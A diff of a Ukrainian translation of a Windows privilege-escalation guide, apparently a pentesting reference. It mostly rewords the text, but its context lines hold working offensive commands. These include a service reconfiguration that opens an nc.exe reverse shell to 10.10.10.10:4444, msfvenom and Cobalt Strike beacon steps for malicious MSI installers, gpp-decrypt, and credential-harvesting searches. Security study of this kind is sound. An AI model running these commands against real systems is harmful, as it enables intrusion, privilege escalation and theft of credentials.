@@ -42,7 +42,7 @@ integrity-levels.md
 
 ### Перерахунок інформації про версію
 
-Перевірте, чи має версія Windows якісь відомі вразливості (також перевірте застосовані патчі).
+Перевірте, чи має версія Windows відомі вразливості (також перевірте застосовані патчі).
 ```bash
 systeminfo
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
@@ -127,7 +127,7 @@ Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
 ```
 ### PowerShell **Script Block Logging**
 
-Повний запис активності та вмісту виконання скрипта фіксується, що забезпечує документування кожного блоку коду під час його виконання. Цей процес зберігає всебічний аудитний слід кожної активності, що є цінним для судової експертизи та аналізу злочинної поведінки. Документуючи всю активність під час виконання, надаються детальні відомості про процес.
+Повний запис активності та вмісту виконання скрипта фіксується, забезпечуючи документування кожного блоку коду під час його виконання. Цей процес зберігає всебічний аудит кожної активності, що є цінним для судової експертизи та аналізу злочинної поведінки. Документуючи всю активність під час виконання, надаються детальні відомості про процес.
 ```bash
 reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
@@ -180,7 +180,7 @@ PSProvider   : Microsoft.PowerShell.Core\Registry
 
 Тоді, **це експлуатовано.** Якщо останній реєстр дорівнює 0, то запис WSUS буде проігноровано.
 
-Для експлуатації цих вразливостей ви можете використовувати інструменти, такі як: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - це скрипти експлойтів MiTM, які дозволяють ввести 'фальшиві' оновлення в трафік WSUS без SSL.
+Для експлуатації цих вразливостей ви можете використовувати інструменти, такі як: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - це зброя MiTM, що використовує експлойти для ін'єкції 'фальшивих' оновлень у трафік WSUS без SSL.
 
 Прочитайте дослідження тут:
 
@@ -201,7 +201,7 @@ CTX_WSUSpect_White_Paper (1).pdf
 
 ## KrbRelayUp
 
-В **локальному підвищенні привілеїв** існує вразливість у Windows **доменних** середовищах за певних умов. Ці умови включають середовища, де **підписування LDAP не є обов'язковим,** користувачі мають самостійні права, що дозволяють їм налаштовувати **обмежену делегацію на основі ресурсів (RBCD),** та можливість для користувачів створювати комп'ютери в домені. Важливо зазначити, що ці **вимоги** виконуються за допомогою **налаштувань за замовчуванням**.
+В **локальному підвищенні привілеїв** існує вразливість у Windows **доменних** середовищах за певних умов. Ці умови включають середовища, де **LDAP підпис не є обов'язковим,** користувачі мають самостійні права, що дозволяють їм налаштовувати **Обмежену делегацію на основі ресурсів (RBCD),** та можливість для користувачів створювати комп'ютери в домені. Важливо зазначити, що ці **вимоги** виконуються за допомогою **налаштувань за замовчуванням**.
 
 Знайдіть **експлойт у** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)
 
@@ -209,7 +209,7 @@ CTX_WSUSpect_White_Paper (1).pdf
 
 ## AlwaysInstallElevated
 
-**Якщо** ці 2 реєстри **увімкнені** (значення **0x1**), тоді користувачі з будь-якими привілеями можуть **встановлювати** (виконувати) `*.msi` файли як NT AUTHORITY\\**SYSTEM**.
+**Якщо** ці 2 реєстри **увімкнені** (значення **0x1**), тоді користувачі будь-якого привілею можуть **встановлювати** (виконувати) `*.msi` файли як NT AUTHORITY\\**SYSTEM**.
 ```bash
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
@@ -227,7 +227,7 @@ msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.ms
 ```
 Write-UserAddMSI
 ```
-Просто виконайте створений бінар для ескалації привілеїв.
+Просто виконайте створений бінар для підвищення привілеїв.
 
 ### MSI Wrapper
 
@@ -237,30 +237,30 @@ Write-UserAddMSI
 msi-wrapper.md
 {{#endref}}
 
-### Create MSI with WIX
+### Створення MSI з WIX
 
 {{#ref}}
 create-msi-with-wix.md
 {{#endref}}
 
-### Create MSI with Visual Studio
+### Створення MSI з Visual Studio
 
-- **Згенеруйте** з Cobalt Strike або Metasploit **новий Windows EXE TCP payload** в `C:\privesc\beacon.exe`
-- Відкрийте **Visual Studio**, виберіть **Створити новий проект** і введіть "installer" у полі пошуку. Виберіть проект **Setup Wizard** і натисніть **Далі**.
-- Дайте проекту ім'я, наприклад, **AlwaysPrivesc**, використовуйте **`C:\privesc`** для розташування, виберіть **розмістити рішення та проект в одній директорії**, і натисніть **Створити**.
-- Продовжуйте натискати **Далі**, поки не дійдете до кроку 3 з 4 (виберіть файли для включення). Натисніть **Додати** і виберіть payload Beacon, який ви щойно згенерували. Потім натисніть **Готово**.
+- **Згенеруйте** з Cobalt Strike або Metasploit **новий Windows EXE TCP payload** у `C:\privesc\beacon.exe`
+- Відкрийте **Visual Studio**, виберіть **Створити новий проект** і введіть "installer" у поле пошуку. Виберіть проект **Setup Wizard** і натисніть **Далі**.
+- Дайте проекту ім'я, наприклад, **AlwaysPrivesc**, використовуйте **`C:\privesc`** для розташування, виберіть **розмістити рішення та проект в одному каталозі**, і натисніть **Створити**.
+- Продовжуйте натискати **Далі**, поки не дійдете до кроку 3 з 4 (виберіть файли для включення). Натисніть **Додати** і виберіть payload Beacon, який ви щойно згенерували. Потім натисніть **Завершити**.
 - Виділіть проект **AlwaysPrivesc** у **Solution Explorer** і в **Властивостях** змініть **TargetPlatform** з **x86** на **x64**.
 - Є й інші властивості, які ви можете змінити, такі як **Автор** та **Виробник**, що можуть зробити встановлений додаток більш легітимним.
 - Клацніть правою кнопкою миші на проекті та виберіть **Перегляд > Користувацькі дії**.
 - Клацніть правою кнопкою миші на **Встановити** та виберіть **Додати користувацьку дію**.
-- Двічі клацніть на **Папка програми**, виберіть ваш файл **beacon.exe** і натисніть **ОК**. Це забезпечить виконання payload beacon, як тільки інсталятор буде запущено.
+- Двічі клацніть на **Тека програми**, виберіть ваш файл **beacon.exe** і натисніть **ОК**. Це забезпечить виконання payload beacon, як тільки інсталятор буде запущено.
 - У **Властивостях користувацької дії** змініть **Run64Bit** на **True**.
 - Нарешті, **зберіть його**.
 - Якщо з'явиться попередження `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, переконайтеся, що ви встановили платформу на x64.
 
-### MSI Installation
+### Встановлення MSI
 
-Щоб виконати **встановлення** шкідливого `.msi` файлу у **фоновому режимі:**
+Щоб виконати **встановлення** шкідливого файлу `.msi` у **фоновому режимі:**
 ```
 msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
 ```
@@ -282,7 +282,7 @@ reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\Subs
 ```
 ### LAPS
 
-**LAPS** призначений для **управління паролями локальних адміністраторів**, забезпечуючи, щоб кожен пароль був **унікальним, випадковим і регулярно оновлювався** на комп'ютерах, приєднаних до домену. Ці паролі надійно зберігаються в Active Directory і можуть бути доступні лише користувачам, яким надано достатні права через ACL, що дозволяє їм переглядати паролі локальних адміністраторів, якщо це дозволено.
+**LAPS** призначений для **управління паролями локальних адміністраторів**, забезпечуючи, щоб кожен пароль був **унікальним, випадковим і регулярно оновлювався** на комп'ютерах, приєднаних до домену. Ці паролі безпечно зберігаються в Active Directory і можуть бути доступні лише користувачам, яким надано достатні права через ACL, що дозволяє їм переглядати паролі локальних адміністраторів, якщо це дозволено.
 
 {{#ref}}
 ../active-directory-methodology/laps.md
@@ -310,7 +310,7 @@ reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
 ```
 ### Cached Credentials
 
-**Облікові дані домену** автентифікуються **Локальним органом безпеки** (LSA) і використовуються компонентами операційної системи. Коли дані входу користувача автентифікуються зареєстрованим пакетом безпеки, облікові дані домену для користувача зазвичай встановлюються.\
+**Доменні облікові дані** автентифікуються **Локальним органом безпеки** (LSA) і використовуються компонентами операційної системи. Коли дані входу користувача автентифікуються зареєстрованим пакетом безпеки, доменні облікові дані для користувача зазвичай встановлюються.\
 [**Більше інформації про кешовані облікові дані тут**](../stealing-credentials/credentials-protections.md#cached-credentials).
 ```bash
 reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
@@ -319,7 +319,7 @@ reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLO
 
 ### Перерахунок Користувачів та Груп
 
-Вам слід перевірити, чи є у будь-яких груп, до яких ви належите, цікаві дозволи
+Вам слід перевірити, чи є у будь-яких груп, до яких ви належите, цікаві дозволи.
 ```bash
 # CMD
 net users %username% #Me
@@ -351,13 +351,13 @@ Get-LocalGroupMember Administrators | ft Name, PrincipalSource
 privilege-escalation-abusing-tokens.md
 {{#endref}}
 
-### Увійшені користувачі / Сесії
+### Увійшли користувачі / Сесії
 ```bash
 qwinsta
 klist sessions
 ```
 ### Домашні папки
-```powershell
+```bash
 dir C:\Users
 Get-ChildItem C:\Users
 ```
@@ -373,8 +373,8 @@ powershell -command "Get-Clipboard"
 
 ### Дозволи на файли та папки
 
-По-перше, при переліку процесів **перевірте наявність паролів у командному рядку процесу**.\
-Перевірте, чи можете ви **перезаписати деякий запущений бінар** або чи маєте ви права на запис у папку з бінаром для експлуатації можливих [**DLL Hijacking атак**](dll-hijacking/index.html):
+Перш за все, перерахування процесів **перевіряє наявність паролів у командному рядку процесу**.\
+Перевірте, чи можете ви **перезаписати деякий запущений бінарний файл** або чи маєте ви права на запис у папці з бінарними файлами для експлуатації можливих [**DLL Hijacking атак**](dll-hijacking/index.html):
 ```bash
 Tasklist /SVC #List processes running and services
 tasklist /v /fi "username eq system" #Filter "system" processes
@@ -431,7 +431,7 @@ Get-Service
 ```bash
 sc qc <service_name>
 ```
-Рекомендується мати бінарний файл **accesschk** від _Sysinternals_, щоб перевірити необхідний рівень привілеїв для кожної служби.
+Рекомендується мати бінарний **accesschk** від _Sysinternals_, щоб перевірити необхідний рівень привілеїв для кожної служби.
 ```bash
 accesschk.exe -ucqv <Service_Name> #Check rights for different groups
 ```
@@ -458,7 +458,7 @@ sc config SSDPSRV obj= ".\LocalSystem" password= ""
 ```
 **Врахуйте, що служба upnphost залежить від SSDPSRV для роботи (для XP SP1)**
 
-**Ще один обхідний шлях** цієї проблеми - виконати:
+**Інший обхідний шлях** цієї проблеми - виконати:
 ```
 sc.exe config usosvc start= auto
 ```
@@ -472,7 +472,7 @@ sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cm
 
 sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
 ```
-### Перезапустити службу
+### Перезапустіть службу
 ```bash
 wmic service NAMEOFSERVICE call startservice
 net stop [service name] && net start [service name]
@@ -481,7 +481,7 @@ net stop [service name] && net start [service name]
 
 - **SERVICE_CHANGE_CONFIG**: Дозволяє переналаштування бінарного файлу служби.
 - **WRITE_DAC**: Дозволяє переналаштування дозволів, що веде до можливості змінювати конфігурації служби.
-- **WRITE_OWNER**: Дозволяє отримання прав власності та переналаштування дозволів.
+- **WRITE_OWNER**: Дозволяє отримання власності та переналаштування дозволів.
 - **GENERIC_WRITE**: Спадкує можливість змінювати конфігурації служби.
 - **GENERIC_ALL**: Також спадкує можливість змінювати конфігурації служби.
 
@@ -489,8 +489,8 @@ net stop [service name] && net start [service name]
 
 ### Слабкі дозволи бінарних файлів служб
 
-**Перевірте, чи можете ви змінити бінарний файл, який виконується службою** або чи маєте ви **права на запис у папці**, де знаходиться бінарний файл ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
-Ви можете отримати кожен бінарний файл, який виконується службою, використовуючи **wmic** (не в system32) та перевірити свої дозволи за допомогою **icacls**:
+**Перевірте, чи можете ви змінити бінарний файл, який виконується службою** або чи маєте ви **дозволи на запис у папці**, де знаходиться бінарний файл ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
+Ви можете отримати кожен бінарний файл, який виконується службою, використовуючи **wmic** (не в system32) і перевірити свої дозволи, використовуючи **icacls**:
 ```bash
 for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt
 
@@ -502,7 +502,7 @@ sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
 FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
 FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
 ```
-### Послуги реєстру змінити дозволи
+### Служби реєстру змінити дозволи
 
 Вам слід перевірити, чи можете ви змінити будь-який реєстр служби.\
 Ви можете **перевірити** свої **дозволи** над реєстром **служби**, виконавши:
@@ -514,7 +514,7 @@ for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\
 
 get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
 ```
-Необхідно перевірити, чи **Authenticated Users** або **NT AUTHORITY\INTERACTIVE** мають права `FullControl`. Якщо так, бінарний файл, виконуваний службою, може бути змінений.
+Необхідно перевірити, чи **Authenticated Users** або **NT AUTHORITY\INTERACTIVE** мають права `FullControl`. Якщо так, бінарний файл, що виконується службою, може бути змінено.
 
 Щоб змінити шлях до виконуваного бінарного файлу:
 ```bash
@@ -533,13 +533,13 @@ appenddata-addsubdirectory-permission-over-service-registry.md
 Якщо шлях до виконуваного файлу не в лапках, Windows спробує виконати кожен закінчення перед пробілом.
 
 Наприклад, для шляху _C:\Program Files\Some Folder\Service.exe_ Windows спробує виконати:
-```powershell
+```bash
 C:\Program.exe
 C:\Program Files\Some.exe
 C:\Program Files\Some Folder\Service.exe
 ```
 Список всіх непозначених шляхів служб, за винятком тих, що належать вбудованим службам Windows:
-```powershell
+```bash
 wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
 wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services
 
@@ -547,7 +547,7 @@ wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Window
 Get-ServiceUnquoted -Verbose
 ```
 
-```powershell
+```bash
 for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
 for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
 echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
@@ -555,7 +555,7 @@ echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s &&
 )
 ```
 
-```powershell
+```bash
 gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
 ```
 **Ви можете виявити та експлуатувати** цю вразливість за допомогою metasploit: `exploit/windows/local/trusted\_service\_path` Ви можете вручну створити бінарний файл служби за допомогою metasploit:
@@ -670,7 +670,7 @@ netstat -ano #Opened ports?
 route print
 Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
 ```
-### ARP Таблиця
+### ARP Table
 ```
 arp -A
 Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
@@ -720,7 +720,7 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDef
 
 Сховище Windows зберігає облікові дані, за якими Windows може автоматично входити в систему, що означає, що будь-яка **Windows програма, яка потребує облікових даних для доступу до ресурсу** (сервера або веб-сайту) **може використовувати цей Менеджер облікових даних** та Сховище Windows і використовувати надані облікові дані замість того, щоб користувачі постійно вводили ім'я користувача та пароль.
 
-Якщо програми не взаємодіють з Менеджером облікових даних, я не думаю, що вони можуть використовувати облікові дані для даного ресурсу. Тож, якщо ваша програма хоче використовувати сховище, вона повинна якимось чином **взаємодіяти з менеджером облікових даних і запитувати облікові дані для цього ресурсу** з сховища за замовчуванням.
+Якщо програми не взаємодіють з Менеджером облікових даних, я не думаю, що вони можуть використовувати облікові дані для даного ресурсу. Тож, якщо ваша програма хоче використовувати сховище, вона повинна якимось чином **взаємодіяти з менеджером облікових даних і запитувати облікові дані для цього ресурсу** з за замовчуванням сховища.
 
 Використовуйте `cmdkey`, щоб перерахувати збережені облікові дані на машині.
 ```bash
@@ -742,19 +742,19 @@ C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\us
 
 ### DPAPI
 
-**API захисту даних (DPAPI)** надає метод симетричного шифрування даних, переважно використовуваний в операційній системі Windows для симетричного шифрування асиметричних приватних ключів. Це шифрування використовує секрети користувача або системи для значного внеску в ентропію.
+**API захисту даних (DPAPI)** надає метод симетричного шифрування даних, переважно використовуваний в операційній системі Windows для симетричного шифрування асиметричних приватних ключів. Це шифрування використовує секрети користувача або системи, щоб значно сприяти ентропії.
 
 **DPAPI дозволяє шифрування ключів за допомогою симетричного ключа, який отримується з секретів входу користувача**. У сценаріях, що стосуються шифрування системи, він використовує секрети аутентифікації домену системи.
 
 Зашифровані RSA ключі користувача, за допомогою DPAPI, зберігаються в каталозі `%APPDATA%\Microsoft\Protect\{SID}`, де `{SID}` представляє [ідентифікатор безпеки](https://en.wikipedia.org/wiki/Security_Identifier) користувача. **Ключ DPAPI, розташований разом з майстер-ключем, який захищає приватні ключі користувача в одному файлі**, зазвичай складається з 64 байтів випадкових даних. (Важливо зазначити, що доступ до цього каталогу обмежений, що заважає перерахунку його вмісту за допомогою команди `dir` у CMD, хоча його можна перерахувати через PowerShell).
-```powershell
+```bash
 Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
 Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
 ```
 Ви можете використовувати **mimikatz module** `dpapi::masterkey` з відповідними аргументами (`/pvk` або `/rpc`), щоб розшифрувати його.
 
-**Файли облікових даних, захищені майстер-паролем**, зазвичай розташовані в:
-```powershell
+**файли облікових даних, захищені майстер-паролем**, зазвичай розташовані в:
+```bash
 dir C:\Users\username\AppData\Local\Microsoft\Credentials\
 dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
@@ -769,10 +769,10 @@ dpapi-extracting-passwords.md
 
 ### PowerShell Credentials
 
-**Облікові дані PowerShell** часто використовуються для **скриптування** та автоматизації завдань як спосіб зберігати зашифровані облікові дані зручно. Облікові дані захищені за допомогою **DPAPI**, що зазвичай означає, що їх можна розшифрувати лише тим же користувачем на тому ж комп'ютері, на якому вони були створені.
+**Облікові дані PowerShell** часто використовуються для **скриптування** та автоматизації як спосіб зберігати зашифровані облікові дані зручно. Облікові дані захищені за допомогою **DPAPI**, що зазвичай означає, що їх можна розшифрувати лише тим же користувачем на тому ж комп'ютері, на якому вони були створені.
 
 Щоб **розшифрувати** облікові дані PS з файлу, що їх містить, ви можете зробити:
-```powershell
+```bash
 PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
 PS C:\> $credential.GetNetworkCredential().username
 
@@ -793,7 +793,7 @@ cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| 
 ```
 ### Збережені RDP з'єднання
 
-Ви можете знайти їх за адресою `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
+Ви можете знайти їх у `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
 та в `HKCU\Software\Microsoft\Terminal Server Client\Servers\`
 
 ### Нещодавно виконані команди
@@ -815,7 +815,7 @@ HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
 ### AppCmd.exe
 
 **Зверніть увагу, що для відновлення паролів з AppCmd.exe вам потрібно бути адміністратором і працювати під високим рівнем цілісності.**\
-**AppCmd.exe** знаходиться в каталозі `%systemroot%\system32\inetsrv\`.\
+**AppCmd.exe** знаходиться в каталозі `%systemroot%\system32\inetsrv\` .\
 Якщо цей файл існує, то можливо, що деякі **облікові дані** були налаштовані і можуть бути **відновлені**.
 
 Цей код був витягнутий з [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
@@ -991,9 +991,9 @@ AppData\Roaming\gcloud\access_tokens.db
 
 ### Cached GPP Pasword
 
-Раніше була доступна функція, яка дозволяла розгортання користувацьких локальних облікових записів адміністратора на групі машин через Group Policy Preferences (GPP). Однак цей метод мав значні недоліки в безпеці. По-перше, об'єкти групової політики (GPO), збережені у вигляді XML-файлів у SYSVOL, могли бути доступні будь-якому користувачу домену. По-друге, паролі в цих GPP, зашифровані за допомогою AES256 з використанням публічно задокументованого ключа за замовчуванням, могли бути розшифровані будь-яким автентифікованим користувачем. Це становило серйозний ризик, оскільки могло дозволити користувачам отримати підвищені привілеї.
+Раніше була доступна функція, яка дозволяла розгортання користувацьких локальних облікових записів адміністратора на групі машин через Групові політики (GPP). Однак цей метод мав значні недоліки в безпеці. По-перше, об'єкти групової політики (GPO), збережені як XML файли в SYSVOL, могли бути доступні будь-якому користувачу домену. По-друге, паролі в цих GPP, зашифровані за допомогою AES256 з використанням публічно задокументованого ключа за замовчуванням, могли бути розшифровані будь-яким автентифікованим користувачем. Це становило серйозний ризик, оскільки могло дозволити користувачам отримати підвищені привілеї.
 
-Щоб зменшити цей ризик, була розроблена функція для сканування локально кешованих GPP-файлів, що містять поле "cpassword", яке не є порожнім. Після знаходження такого файлу функція розшифровує пароль і повертає користувацький об'єкт PowerShell. Цей об'єкт містить деталі про GPP та місцезнаходження файлу, що допомагає в ідентифікації та усуненні цієї вразливості в безпеці.
+Щоб зменшити цей ризик, була розроблена функція для сканування локально кешованих GPP файлів, що містять поле "cpassword", яке не є порожнім. Після знаходження такого файлу функція розшифровує пароль і повертає користувацький об'єкт PowerShell. Цей об'єкт містить деталі про GPP та місцезнаходження файлу, що допомагає в ідентифікації та усуненні цієї вразливості в безпеці.
 
 Шукайте в `C:\ProgramData\Microsoft\Group Policy\history` або в _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (до W Vista)_ ці файли:
 
@@ -1014,16 +1014,16 @@ gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
 crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
 ```
 ### IIS Web Config
-```powershell
+```bash
 Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
 ```
 
-```powershell
+```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
 C:\inetpub\wwwroot\web.config
 ```
 
-```powershell
+```bash
 Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
 Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
 ```
@@ -1181,9 +1181,9 @@ reg query "HKCU\Software\OpenSSH\Agent\Key"
 
 ### **Перезапис COM DLL**
 
-**Component Object Model (COM)** - це технологія, вбудована в операційну систему Windows, яка дозволяє **взаємодію** між програмними компонентами різних мов. Кожен компонент COM **ідентифікується за допомогою ідентифікатора класу (CLSID)**, а кожен компонент надає функціональність через один або кілька інтерфейсів, які ідентифікуються за допомогою ідентифікаторів інтерфейсу (IIDs).
+**Компонентна об'єктна модель (COM)** - це технологія, вбудована в операційну систему Windows, яка дозволяє **взаємодію** між програмними компонентами різних мов. Кожен компонент COM **ідентифікується за допомогою ідентифікатора класу (CLSID)**, а кожен компонент надає функціональність через один або кілька інтерфейсів, які ідентифікуються за допомогою ідентифікаторів інтерфейсу (IIDs).
 
-Класи та інтерфейси COM визначені в реєстрі під **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** та **HKEY\_**_**CLASSES\_**_**ROOT\Interface** відповідно. Цей реєстр створюється шляхом об'єднання **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT.**
+Класи та інтерфейси COM визначені в реєстрі під **HKEY\CLASSES\ROOT\CLSID** та **HKEY\CLASSES\ROOT\Interface** відповідно. Цей реєстр створюється шляхом об'єднання **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**
 
 Всередині CLSID цього реєстру ви можете знайти дочірній реєстр **InProcServer32**, який містить **значення за замовчуванням**, що вказує на **DLL**, та значення під назвою **ThreadingModel**, яке може бути **Apartment** (однопотоковий), **Free** (багатопотоковий), **Both** (один або кілька) або **Neutral** (нейтральний потік).
 
@@ -1205,7 +1205,7 @@ cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
 findstr /si password *.xml *.ini *.txt *.config
 findstr /spin "password" *.*
 ```
-**Шукати файл з певним ім'ям**
+**Шукати файл з певною назвою**
 ```bash
 dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
 where /R C:\ user.txt
@@ -1231,29 +1231,33 @@ Invoke-SessionGopher -Thorough
 Invoke-SessionGopher -AllDomain -o
 Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
 ```
-## Leaked Handlers
+## Витік обробників
 
 Уявіть, що **процес, що працює як SYSTEM, відкриває новий процес** (`OpenProcess()`) з **повним доступом**. Той же процес **також створює новий процес** (`CreateProcess()`) **з низькими привілеями, але успадковує всі відкриті дескриптори основного процесу**.\
-Тоді, якщо у вас є **повний доступ до процесу з низькими привілеями**, ви можете захопити **відкритий дескриптор до привілейованого процесу, створеного** з `OpenProcess()` і **інжектувати shellcode**.\
-[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
-[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).
+Тоді, якщо у вас є **повний доступ до процесу з низькими привілеями**, ви можете отримати **відкритий дескриптор до привілейованого процесу, створеного** з `OpenProcess()` і **впровадити shellcode**.\
+[Прочитайте цей приклад для отримання додаткової інформації про **те, як виявити та експлуатувати цю вразливість**.](leaked-handle-exploitation.md)\
+[Прочитайте цей **інший пост для більш детального пояснення про те, як тестувати та зловживати більш відкритими обробниками процесів і потоків, успадкованими з різними рівнями дозволів (не тільки з повним доступом)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).
 
-## Named Pipe Client Impersonation
+## Імітація клієнта іменованого каналу
 
-Спільні сегменти пам'яті, відомі як **трубопроводи**, дозволяють процесам спілкуватися та передавати дані.
+Спільні сегменти пам'яті, які називаються **каналами**, дозволяють процесам спілкуватися та передавати дані.
 
-Windows надає функцію під назвою **Named Pipes**, що дозволяє несумісним процесам ділитися даними, навіть через різні мережі. Це нагадує архітектуру клієнт/сервер, з ролями, визначеними як **сервер іменованих трубопроводів** та **клієнт іменованих трубопроводів**.
+Windows надає функцію, звану **іменованими каналами**, що дозволяє несумісним процесам ділитися даними, навіть через різні мережі. Це нагадує архітектуру клієнт/сервер, з ролями, визначеними як **сервер іменованого каналу** та **клієнт іменованого каналу**.
 
-Коли дані надсилаються через трубопровід клієнтом, **сервер**, який налаштував трубопровід, має можливість **прийняти особистість** **клієнта**, якщо у нього є необхідні **SeImpersonate** права. Визначення **привілейованого процесу**, який спілкується через трубопровід, особистість якого ви можете імітувати, надає можливість **отримати вищі привілеї**, прийнявши особистість цього процесу, як тільки він взаємодіє з трубопроводом, який ви створили. Для інструкцій щодо виконання такого нападу корисні посібники можна знайти [**here**](named-pipe-client-impersonation.md) та [**here**](#from-high-integrity-to-system).
+Коли дані надсилаються через канал **клієнтом**, **сервер**, який налаштував канал, має можливість **прийняти особистість** **клієнта**, якщо у нього є необхідні **права SeImpersonate**. Виявлення **привілейованого процесу**, який спілкується через канал, особистість якого ви можете імітувати, надає можливість **отримати вищі привілеї**, прийнявши особистість цього процесу, як тільки він взаємодіє з каналом, який ви створили. Для інструкцій щодо виконання такого нападу корисні посібники можна знайти [**тут**](named-pipe-client-impersonation.md) та [**тут**](#from-high-integrity-to-system).
 
-Також наступний інструмент дозволяє **перехоплювати комунікацію іменованого трубопроводу за допомогою інструменту, такого як burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **і цей інструмент дозволяє перерахувати та переглянути всі трубопроводи для пошуку privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)
+Також наступний інструмент дозволяє **перехоплювати комунікацію іменованого каналу за допомогою інструменту, як burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **і цей інструмент дозволяє перерахувати та переглянути всі канали, щоб знайти privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)
 
-## Misc
+## Різне
 
-### **Monitoring Command Lines for passwords**
+### Розширення файлів, які можуть виконувати програми в Windows
 
